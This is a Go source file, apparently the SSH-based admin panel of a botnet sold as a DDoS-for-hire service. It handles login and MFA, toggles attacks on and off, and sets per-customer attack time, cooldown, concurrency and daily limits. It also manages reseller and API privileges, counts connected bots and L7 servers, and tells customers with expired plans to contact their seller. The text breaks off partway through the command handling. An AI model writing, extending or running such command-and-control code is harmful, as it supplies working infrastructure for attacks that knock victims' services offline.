package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"time"

	"net/http"
	"net/url"

	"github.com/alexeyco/simpletable"
)

const (
	ansiReset     = "\x1b[0m"        // Resetea el color al predeterminado
	ansiPrimary   = "\x1b[37m"       // Blanco para el texto principal
	ansiCommands  = "\x1b[97m"       // Blanco brillante para comandos y elementos interactivos
	ansiPrompt    = "\x1b[38;5;196m" // 🔴 rojo 256
	ansiPath      = "\x1b[97m"       // Blanco para rutas
	ansiSuccess   = "\x1b[92m"       // Verde brillante para éxitos
	ansiSystem    = "\x1b[38;5;196m" // 🔴 rojo 256
	ansiNumbers   = "\x1b[36m"       // Cian para números y estadísticas
	ansiWarning   = "\x1b[33m"       // Amarillo para advertencias
	ansiError     = "\x1b[31m"       // Rojo para errores
	ansiSeparator = "\x1b[97m"       // Blanco para separadores y texto neutro
	ansiBlink     = "\x1b[5m"        // Parpadeo para el prompt
)

const (
	promptHost = "botnet"
	promptPath = "~/panel"

	loginUsernameMaxAttempts = 2
	loginPasswordMaxAttempts = 2
)

func redGradientText(s string) string {
	gradient := []string{
		"\x1b[38;5;52m",
		"\x1b[38;5;88m",
		"\x1b[38;5;124m",
		"\x1b[38;5;160m",
		"\x1b[38;5;196m",
		"\x1b[38;5;203m",
		"\x1b[38;5;209m",
		"\x1b[38;5;203m",
		"\x1b[38;5;196m",
		"\x1b[38;5;160m",
		"\x1b[38;5;124m",
		"\x1b[38;5;88m",
		"\x1b[38;5;52m",
	}

	var out strings.Builder
	out.Grow(len(s) * 2)
	colorIndex := 0
	for _, ch := range s {
		if ch == ' ' || ch == '\t' {
			out.WriteRune(ch)
			continue
		}
		out.WriteString(gradient[colorIndex%len(gradient)])
		out.WriteRune(ch)
		out.WriteString(ansiReset)
		colorIndex++
	}
	return out.String()
}

func stripANSICodes(s string) string {
	var out strings.Builder
	out.Grow(len(s))
	inEscape := false
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if inEscape {
			if ch == 'm' {
				inEscape = false
			}
			continue
		}
		if ch == 0x1b {
			inEscape = true
			continue
		}
		out.WriteByte(ch)
	}
	return out.String()
}

func colorTableBorders(s string) string {
	borderChars := map[rune]bool{
		'+': true, '-': true, '=': true, '|': true,
	}

	lines := strings.Split(s, "\n")
	var out strings.Builder
	for i, line := range lines {
		stripped := stripANSICodes(line)
		isBorderLine := true
		for _, ch := range stripped {
			if ch == ' ' || ch == '\t' {
				continue
			}
			if !borderChars[ch] {
				isBorderLine = false
				break
			}
		}

		inEscape := false
		for _, ch := range line {
			if inEscape {
				out.WriteRune(ch)
				if ch == 'm' {
					inEscape = false
				}
				continue
			}
			if ch == 0x1b {
				inEscape = true
				out.WriteRune(ch)
				continue
			}

			if isBorderLine {
				if borderChars[ch] {
					out.WriteString(ansiSeparator)
					out.WriteRune(ch)
					out.WriteString(ansiReset)
				} else {
					out.WriteRune(ch)
				}
				continue
			}

			if ch == '|' {
				out.WriteString(ansiSeparator)
				out.WriteRune(ch)
				out.WriteString(ansiReset)
			} else {
				out.WriteRune(ch)
			}
		}

		if i < len(lines)-1 {
			out.WriteString("\n")
		}
	}

	return out.String()
}

func writeGradientTable(conn net.Conn, headers []string, rows [][]string) {
	table := simpletable.New()
	table.Header = &simpletable.Header{Cells: make([]*simpletable.Cell, 0, len(headers))}
	for _, h := range headers {
		table.Header.Cells = append(table.Header.Cells, &simpletable.Cell{
			Align: simpletable.AlignCenter,
			Text:  redGradientText(h),
		})
	}

	for _, row := range rows {
		cells := make([]*simpletable.Cell, 0, len(row))
		for i, value := range row {
			text := value
			if i == 0 {
				text = redGradientText(value)
			}
			cells = append(cells, &simpletable.Cell{
				Align: simpletable.AlignLeft,
				Text:  text,
			})
		}
		table.Body.Cells = append(table.Body.Cells, cells)
	}

	table.SetStyle(simpletable.StyleCompactLite)
	colored := colorTableBorders(table.String())
	conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
}

func loginCredentialPrompt(label string) string {
	return fmt.Sprintf("%s%s%s %s->%s %s", ansiCommands, label, ansiReset, ansiPrompt, ansiReset, ansiCommands)
}

func adminPrompt(session *Session) string {
	parts := strings.Split(promptPath, "/")
	var pathBuilder strings.Builder
	for i, part := range parts {
		if i > 0 {
			pathBuilder.WriteString(ansiReset + ansiSystem + "/" + ansiReset)
		}
		color := ansiPath
		if part == "~" || part == "panel" {
			color = ansiCommands
		}
		pathBuilder.WriteString(color + part)
	}
	pathStyled := pathBuilder.String() + ansiReset
	return strings.Join([]string{
		ansiCommands, session.User.Username, ansiReset,
		ansiSystem, "@", ansiReset,
		ansiCommands, promptHost, ansiReset,
		ansiSystem, ":", ansiReset,
		pathStyled,
		" ",
		ansiBlink, ansiSuccess, "$", ansiReset,
		" ",
		ansiCommands,
	}, "")
}

// admin function
// Legacy entrypoint kept for compatibility. Admin access is SSH-only.
func Admin(conn net.Conn) {
	AdminSSH(conn)
}

// FormatBool will take the string and convert into a coloured boolean
func FormatBool(b bool) string {
	if b {
		return ansiSuccess + "true" + ansiReset
	}

	return ansiWarning + "false" + ansiReset
}

// AdminSSH maneja la consola administrativa para conexiones SSH.
func AdminSSH(conn net.Conn) {
	// Consola interactiva ANSI sobre canal SSH.
	conn.Write([]byte("\033[2J\033[1H"))
	writeLoginBanner(conn)

	var (
		account *User
		err     error
	)

	for attempt := 1; attempt <= loginUsernameMaxAttempts; attempt++ {
		username, readErr := readSSHLine(conn, loginCredentialPrompt("Username"), "", 20, []string{})
		if readErr != nil {
			return
		}

		account, err = FindUser(username)
		if err == nil && account != nil {
			break
		}

		remaining := loginUsernameMaxAttempts - attempt
		if remaining > 0 {
			conn.Write([]byte(fmt.Sprintf("%sWrong username.%s %s%d%s attempt(s) left.\r\n", ansiError, ansiReset, ansiNumbers, remaining, ansiReset)))
		}
	}

	if account == nil {
		conn.Write([]byte(ansiError + "Username attempt limit reached. Connection closed." + ansiReset + "\r\n"))
		time.Sleep(150 * time.Millisecond)
		return
	}

	authorized := false
	for attempt := 1; attempt <= loginPasswordMaxAttempts; attempt++ {
		password, readErr := readSSHLine(conn, loginCredentialPrompt("Password"), "*", 20, []string{})
		if readErr != nil {
			return
		}
		if password == account.Password {
			authorized = true
			break
		}

		remaining := loginPasswordMaxAttempts - attempt
		if remaining > 0 {
			conn.Write([]byte(fmt.Sprintf("%sWrong password.%s %s%d%s attempt(s) left.\r\n", ansiError, ansiReset, ansiNumbers, remaining, ansiReset)))
		}
	}

	if !authorized {
		conn.Write([]byte(ansiError + "Password attempt limit reached. Connection closed." + ansiReset + "\r\n"))
		time.Sleep(150 * time.Millisecond)
		return
	}

	if account.NewUser {
		conn.Write([]byte(ansiSystem + "Change to new password" + ansiReset + "\r\n"))
		newpassword, err := readSSHLine(conn, loginCredentialPrompt("New password"), "*", 20, []string{})
		if err != nil {
			return
		}
		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte(ansiError + "Cant change password!" + ansiReset))
			time.Sleep(50 * time.Millisecond)
			return
		}
		_ = ModifyField(account, "newuser", false)
		account.NewUser = false
	}

	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte(ansiWarning + "Your plan has expired! contact your seller to renew!" + ansiReset))
		time.Sleep(10 * time.Second)
		return
	}

	if err := verifyUserMFA(conn, account); err != nil {
		conn.Write([]byte(ansiError + "MFA verification failed (3 attempts). Connection closed." + ansiReset + "\r\n"))
		time.Sleep(150 * time.Millisecond)
		return
	}

	// Crear sesiÃ³n y continuar
	session := NewSession(conn, account)
	defer delete(Sessions, session.Opened.Unix())

	conn.Write([]byte("\033[2J\033[1H"))
	writeAdminHeader(conn, session.User)

	blankAfterCommand := false
	for {
		if blankAfterCommand {
			conn.Write([]byte("\r\n"))
		}

		command, err := readSSHLine(
			conn,
			adminPrompt(session),
			"",
			60,
			session.History,
		)
		if err != nil {
			return
		}

		conn.Write([]byte("\r\n"))
		cmdName := strings.Split(strings.ToLower(command), " ")[0]
		if cmdName == "clear" || cmdName == "cls" || cmdName == "c" {
			blankAfterCommand = false
		} else {
			blankAfterCommand = true
		}
		session.History = append(session.History, command)

		// Main command handling

		switch cmdName {

		// Help command
		//==============================================================================================================================================================================================================================================================================================================================//

		case "?", "help", "h":
			if !writeHelpBanner(session.Conn, session.User) {
				session.Conn.Write([]byte(ansiWarning + "No help banner found for the current theme." + ansiReset + "\r\n"))
			}
			continue

			// Admin help command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "admin?", "adminhelp":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
				continue
			}

			rows := [][]string{
				{"attacks", ansiCommands + "Enable or disable attacks possible" + ansiReset},
				{"reset_user", ansiCommands + "Reset a user's attack logs" + ansiReset},
				{"mfa enable|disable|reset|status <user>", ansiCommands + "Enable, disable, reset or view MFA status for a user" + ansiReset},
				{"bots", ansiCommands + "Show connected bots" + ansiReset},
				{"api", ansiCommands + "API examples or help" + ansiReset},
				{"admin", ansiCommands + "Change user privileges" + ansiReset},
				{"reseller", ansiCommands + "Make a user a reseller" + ansiReset},
				{"maxtime", ansiCommands + "Change attack maximum time" + ansiReset},
				{"cooldown", ansiCommands + "Change user cooldown period" + ansiReset},
				{"max_daily", ansiCommands + "Change maximum daily attacks" + ansiReset},
				{"conns", ansiCommands + "Change maximum concurrents attacks" + ansiReset},
				{"days", ansiCommands + "Add days to a user's account" + ansiReset},
				{"create", ansiCommands + "Create a new user" + ansiReset},
				{"remove", ansiCommands + "Remove an existing user" + ansiReset},
				{"broadcast", ansiCommands + "Broadcast a message to all connected clients" + ansiReset},
				{"users", ansiCommands + "Show all users in the database" + ansiReset},
				{"ongoing", ansiCommands + "Show ongoing attacks" + ansiReset},
				{"sessions", ansiCommands + "Show all active sessions" + ansiReset},
			}
			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)

		// Clear command
		case "clear", "cls", "c":
			conn.Write([]byte("\033[2J\033[1H"))
			writeAdminHeader(conn, session.User)
			continue

		case "themes":
			args := strings.Fields(command)
			if len(args) == 1 {
				currentTheme := resolveThemeName(session.User.Theme)
				session.Conn.Write([]byte(ansiSystem + "Available themes:" + ansiReset + "\r\n"))
				for _, theme := range availableAdminThemes() {
					line := ansiCommands + "> " + theme + ansiReset
					if theme == currentTheme {
						line += " " + ansiSuccess + "(current)" + ansiReset
					}
					session.Conn.Write([]byte(line + "\r\n"))
				}
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": themes apply <theme>\r\n"))
				continue
			}

			if len(args) >= 3 && strings.EqualFold(args[1], "apply") {
				theme := normalizeThemeName(args[2])
				if !isKnownTheme(theme) {
					session.Conn.Write([]byte(ansiError + "Unknown theme." + ansiReset + "\r\n"))
					session.Conn.Write([]byte(ansiSeparator + "Available" + ansiReset + ": " + strings.Join(availableAdminThemes(), ", ") + "\r\n"))
					continue
				}

				if err := ModifyField(session.User, "theme", theme); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to apply theme: " + err.Error() + ansiReset + "\r\n"))
					continue
				}

				session.User.Theme = theme
				conn.Write([]byte("\033[2J\033[1H"))
				writeAdminHeader(conn, session.User)
				continue
			}

			session.Conn.Write([]byte(ansiWarning + "Usage: themes | themes apply <theme>" + ansiReset + "\r\n"))
			continue

		case "mfa":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
				continue
			}

			args := strings.Fields(command)
			if len(args) != 3 {
				session.Conn.Write([]byte(ansiWarning + "Usage: mfa enable|disable|reset|status <user>" + ansiReset + "\r\n"))
				continue
			}

			action := strings.ToLower(args[1])
			targetName := strings.TrimSpace(args[2])
			targetUser, err := FindUser(targetName)
			if err != nil || targetUser == nil {
				session.Conn.Write([]byte(ansiError + "Unknown user." + ansiReset + "\r\n"))
				continue
			}

			switch action {
			case "status":
				secretSet := strings.TrimSpace(targetUser.MFASecret) != ""
				if strings.EqualFold(targetUser.Username, "root") {
					session.Conn.Write([]byte(ansiSystem + "MFA status for " + ansiCommands + targetUser.Username + ansiReset + ": " + ansiWarning + "exempt" + ansiReset + ", secret_set=" + FormatBool(false) + "\r\n"))
					continue
				}
				session.Conn.Write([]byte(ansiSystem + "MFA status for " + ansiCommands + targetUser.Username + ansiReset + ": enabled=" + FormatBool(targetUser.MFA) + ", secret_set=" + FormatBool(secretSet) + "\r\n"))
			case "enable", "on", "true":
				if strings.EqualFold(targetUser.Username, "root") {
					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
					continue
				}
				if err := ModifyField(targetUser, "mfa", true); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to enable MFA." + ansiReset + "\r\n"))
					continue
				}
				targetUser.MFA = true
				session.Conn.Write([]byte(ansiSuccess + "MFA enabled for " + targetUser.Username + ansiReset + "\r\n"))
			case "disable", "off", "false":
				if strings.EqualFold(targetUser.Username, "root") {
					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
					continue
				}
				if err := ModifyField(targetUser, "mfa", false); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to disable MFA." + ansiReset + "\r\n"))
					continue
				}
				targetUser.MFA = false
				session.Conn.Write([]byte(ansiWarning + "MFA disabled for " + targetUser.Username + ansiReset + "\r\n"))
			case "reset":
				if strings.EqualFold(targetUser.Username, "root") {
					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
					continue
				}
				if err := ModifyField(targetUser, "mfa", true); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to reset MFA." + ansiReset + "\r\n"))
					continue
				}
				if err := ModifyField(targetUser, "mfa_secret", ""); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to reset MFA secret." + ansiReset + "\r\n"))
					continue
				}
				targetUser.MFA = true
				targetUser.MFASecret = ""
				session.Conn.Write([]byte(ansiSuccess + "MFA reset for " + targetUser.Username + ". Next login will require setup." + ansiReset + "\r\n"))
			default:
				session.Conn.Write([]byte(ansiWarning + "Usage: mfa enable|disable|reset|status <user>" + ansiReset + "\r\n"))
			}
			continue

		case "methods":
			if !writeThemeMethodsBanner(session.Conn, session.User) {
				session.Conn.Write([]byte(ansiWarning + "No methods banner found for the current theme." + ansiReset + "\r\n"))
			}
			continue

			// Flags command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "flags":
			args := strings.Fields(command)[1:]
			if len(args) == 0 {
				session.Conn.Write([]byte(ansiSystem + "Usage: flags <method>\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Example" + ansiReset + ": flags .http\r\n"))
				continue
			}

			methodName := args[0]
			lookupName := methodName
			if !strings.HasPrefix(methodName, ".") {
				lookupName = "." + methodName
			}
			method, ok := Methods[lookupName]
			if !ok {
				method, ok = Methods[methodName]
				if !ok {
					session.Conn.Write([]byte(ansiError + "Unknown method: " + methodName + ansiReset + "\r\n"))
					continue
				}
			}

			var rows [][]string
			for _, flagID := range method.Flags {
				var flagName, description string
				for name, f := range Flags {
					if f.ID == flagID {
						flagName = name
						description = f.Description
						break
					}
				}
				if flagName == "" {
					flagName = fmt.Sprintf("id:%d", flagID)
					description = "Unknown flag"
				}
				// Pasamos solo texto plano; writeGradientTable se encarga del color
				rows = append(rows, []string{flagName, description})
			}

			if len(rows) == 0 {
				session.Conn.Write([]byte(ansiWarning + "No flags defined for this method.\r\n" + ansiReset))
				continue
			}

			headers := []string{"Flag", "Description"}
			writeGradientTable(session.Conn, headers, rows)

			//attacks command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "attacks":
			args := strings.Split(strings.ToLower(command), " ")[1:]
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
				continue
			}
			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if Attacks {
					status = ansiSuccess + "enabled" + ansiReset
				}
				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|global <n>|reset_user <user>\r\n"))
				continue
			}

			switch strings.ToLower(args[0]) {

			case "enable", "enabled", "active", "on", "attacks": // Enable attacks
				Attacks = true
				session.Conn.Write([]byte(ansiSuccess + "Attacks are now enabled!" + ansiReset + "\r\n"))
			case "disable", "disabled", "off", "!attacks": // Disable attacks
				Attacks = false
				session.Conn.Write([]byte(ansiWarning + "Attacks are now disabled!" + ansiReset + "\r\n"))
			case "status":
				status := ansiWarning + "disabled" + ansiReset
				if Attacks {
					status = ansiSuccess + "enabled" + ansiReset
				}
				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))

			case "global":
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
					continue
				}

				new, err := strconv.Atoi(args[1])
				if err != nil {
					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
					continue
				}

				if new < 0 {
					session.Conn.Write([]byte(ansiWarning + "Value cannot be negative." + ansiReset + "\r\n"))
					continue
				}

				Options.Templates.Attacks.MaximumOngoing = new
				session.Conn.Write([]byte(ansiSuccess + "Attacks max running global cap changed!" + ansiReset + "\r\n"))

			case "reset_user": // Reset a users attack logs
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte(ansiWarning + "Include a username" + ansiReset + "\r\n"))
					continue
				}

				if usr, _ := FindUser(args[1]); usr == nil {
					session.Conn.Write([]byte(ansiWarning + "Include a valid username" + ansiReset + "\r\n"))
					continue
				}

				if err := CleanAttacksForUser(args[1]); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to clean attack logs!" + ansiReset + "\r\n"))
					continue
				}

				session.Conn.Write([]byte(ansiSuccess + "Attack logs reset for that user" + ansiReset + "\r\n"))
			default:
				session.Conn.Write([]byte(ansiWarning + "Unknown attacks command." + ansiReset + "\r\n"))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|status|global <n>|reset_user <user>\r\n"))
			}

			continue

			// Bots command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "bots":
			// Non-admins can not see the different types of client sources connected
			if !session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf("%sTotal%s %s%d%s\r\n", ansiSeparator, ansiReset, ansiNumbers, len(Clients), ansiReset)))
				continue
			}

			// Loops through all the access clients
			for source, amount := range SortClients(make(map[string]int)) {
				session.Conn.Write([]byte(fmt.Sprintf("%s%s%s: %s%d%s\r\n", ansiPrimary, source, ansiReset, ansiNumbers, amount, ansiReset)))
			}

			continue

			//Servers L7
			//==============================================================================================================================================================================================================================================================================================================================//

		case "servers":
			// Solo admin
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiError + "You do not have permission to view servers" + ansiReset + "\r\n"))
				continue
			}
			workersMux.RLock()
			total := len(workers)
			workersMux.RUnlock()
			session.Conn.Write([]byte(fmt.Sprintf("%sServers%s: %s%d%s\r\n",
				ansiPrimary, ansiReset, ansiNumbers, total, ansiReset)))
			continue

			// API examples/help
			//==============================================================================================================================================================================================================================================================================================================================//

		case "api": // API examples/help
			if !session.User.API && !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have API access!" + ansiReset + "\r\n"))
				continue
			} else if session.User.Admin || session.User.Reseller && session.User.API {
				args := strings.Split(command, " ")[1:]

				if len(args) == 0 {
					status := ansiWarning + "disabled" + ansiReset
					if session.User.API {
						status = ansiSuccess + "enabled" + ansiReset
					}
					session.Conn.Write([]byte(ansiSystem + "Your API status: " + status + "\r\n" + ansiReset))
					session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": api <true/false> <username>\r\n"))
					continue
				}

				if len(args) <= 1 {
					session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
					continue
				}

				status, err := strconv.ParseBool(args[0])
				if err != nil {
					session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
					continue
				}

				user, err := FindUser(args[1])
				if err != nil || user == nil {
					session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
					continue
				}

				if user.API == status {
					session.Conn.Write([]byte(ansiWarning + "Status is already what you are trying to change too" + ansiReset + "\r\n"))
					continue
				}

				if err := ModifyField(user, "api", status); err != nil {
					session.Conn.Write([]byte(ansiError + "Failed to modify users api status" + ansiReset + "\r\n"))
					continue
				}

				session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users api status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sHey %s, it seems you have API access!%s\r\n", ansiSystem, session.User.Username, ansiReset)))

			// Admin command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "admin":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Fields(command)[1:] // Usa Fields para mejor manejo

			if len(args) == 0 {
				// Muestra ayuda y estado del propio usuario
				status := ansiSuccess + "true" + ansiReset
				session.Conn.Write([]byte(ansiSystem + "Your admin status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": admin <true/false> <username>\r\n"))
				continue
			}

			if len(args) < 2 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username and boolean (true/false)" + ansiReset + "\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "Invalid boolean value. Use true or false." + ansiReset + "\r\n"))
				continue
			}

			username := args[1]
			user, err := FindUser(username)
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User does not exist" + ansiReset + "\r\n"))
				continue
			}

			if user.Admin == status {
				session.Conn.Write([]byte(ansiWarning + "Status is already set to that value" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "admin", status); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify user's admin status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed user's admin status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
			continue

			// Reseller command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "reseller":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.Reseller {
					status = ansiSuccess + "enabled" + ansiReset
				}
				session.Conn.Write([]byte(ansiSystem + "Your reseller status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": reseller <true/false> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if user.Reseller == status {
				session.Conn.Write([]byte(ansiWarning + "Status is already what you are trying to change too" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "reseller", status); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users reseller status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users reseller status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
			continue

			// Maxtime command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "maxtime":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.Maxtime > 0 {
					status = fmt.Sprintf("%s%d seconds%s", ansiNumbers, session.User.Maxtime, ansiReset)
				}
				session.Conn.Write([]byte(ansiSystem + "Your maxtime status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": maxtime <seconds> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			maxtime, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "maxtime", maxtime); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users maxtime status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, maxtime, ansiSuccess, ansiReset)))
			continue

			// Cooldown command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "cooldown":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.Cooldown > 0 {
					status = fmt.Sprintf("%s%d seconds%s", ansiNumbers, session.User.Cooldown, ansiReset)
				}
				session.Conn.Write([]byte(ansiSystem + "Your cooldown status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": cooldown <seconds> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			cooldown, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "cooldown", cooldown); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users cooldown status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users cooldown status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, cooldown, ansiSuccess, ansiReset)))
			continue

			// Conns command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "conns":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.Conns > 0 {
					status = fmt.Sprintf("%s%d%s", ansiNumbers, session.User.Conns, ansiReset)
				}
				session.Conn.Write([]byte(ansiSystem + "Your conns status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": conns <number> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			conns, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "conns", conns); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users conns status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users conns status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, conns, ansiSuccess, ansiReset)))
			continue

			// Max_daily command
			//==============================================================================================================================================================================================================================================================================================================================//

		case "max_daily":
			if !session.User.Admin {
				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]

			if len(args) == 0 {
				status := ansiWarning + "disabled" + ansiReset
				if session.User.MaxDaily > 0 {
					status = fmt.Sprintf("%s%d%s", ansiNumbers, session.User.MaxDaily, ansiReset)
				}
				session.Conn.Write([]byte(ansiSystem + "Your max_daily status: " + status + "\r\n" + ansiReset))
				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": max_daily <number> <username>\r\n"))
				continue
			}

			if len(args) <= 1 {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
				continue
			}

			if err := ModifyField(user, "max_daily", days); err != nil {
				session.Conn.Write([]byte(ansiError + "Failed to modify users max_daily status" + ansiReset + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users max_daily status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
			continue

			// Add days to a user's account
